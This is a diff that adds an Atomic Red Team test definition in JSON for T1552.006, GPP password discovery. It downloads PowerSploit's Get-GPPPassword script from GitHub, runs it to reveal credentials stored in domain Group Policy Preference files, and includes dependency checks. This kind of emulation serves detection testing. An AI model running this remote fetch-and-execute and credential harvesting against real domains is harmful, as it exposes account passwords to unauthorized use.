@@ -1,0 +1,145 @@
+{
+  "id": "e9584f82-322c-474a-b831-940fd8b4455c",
+  "name": "GPP Passwords (Get-GPPPassword)",
+  "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b524a34a-7f8c-4365-b369-7240069a848b",
+      "type": "execute-command",
+      "data": {
+        "command": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f086f02f-f8a8-4357-a568-4e281e0fe81b",
+      "name": "Check dependency 1/2",
+      "description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "92f676fd-aa5f-457f-99b2-18367f2e53a3",
+      "name": "Resolve dependency 1/2",
+      "description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a55a1df3-30b2-4603-924a-bf4b169b1d3f",
+      "name": "Re-check dependency 1/2",
+      "description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "86bd2048-69ea-4360-827f-874e73f4db6b",
+      "name": "Check dependency 2/2",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d7b118a5-29fd-4dc3-a9ef-ec92f6beb277",
+      "name": "Resolve dependency 2/2",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host Joining this computer to a domain must be done manually\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3e7753ef-597c-4577-a283-c181170d8907",
+      "name": "Re-check dependency 2/2",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "f086f02f-f8a8-4357-a568-4e281e0fe81b",
+      "p": "on-success",
+      "o": "b524a34a-7f8c-4365-b369-7240069a848b"
+    },
+    {
+      "s": "f086f02f-f8a8-4357-a568-4e281e0fe81b",
+      "p": "on-failure",
+      "o": "92f676fd-aa5f-457f-99b2-18367f2e53a3"
+    },
+    {
+      "s": "92f676fd-aa5f-457f-99b2-18367f2e53a3",
+      "p": "on-success",
+      "o": "a55a1df3-30b2-4603-924a-bf4b169b1d3f"
+    },
+    {
+      "s": "a55a1df3-30b2-4603-924a-bf4b169b1d3f",
+      "p": "on-failure",
+      "o": "b524a34a-7f8c-4365-b369-7240069a848b"
+    },
+    {
+      "s": "86bd2048-69ea-4360-827f-874e73f4db6b",
+      "p": "on-success",
+      "o": "b524a34a-7f8c-4365-b369-7240069a848b"
+    },
+    {
+      "s": "86bd2048-69ea-4360-827f-874e73f4db6b",
+      "p": "on-failure",
+      "o": "d7b118a5-29fd-4dc3-a9ef-ec92f6beb277"
+    },
+    {
+      "s": "d7b118a5-29fd-4dc3-a9ef-ec92f6beb277",
+      "p": "on-success",
+      "o": "3e7753ef-597c-4577-a283-c181170d8907"
+    },
+    {
+      "s": "3e7753ef-597c-4577-a283-c181170d8907",
+      "p": "on-failure",
+      "o": "b524a34a-7f8c-4365-b369-7240069a848b"
+    }
+  ],
+  "tags": [
+    "T1552.006",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "gpp_script_url",
+      "type": "url",
+      "description": "URL of the Get-GPPPassword PowerShell Script",
+      "value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"
+    },
+    {
+      "name": "gpp_script_path",
+      "type": "path",
+      "description": "Path to the Get-GPPPassword PowerShell Script",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"
+    }
+  ]
+}
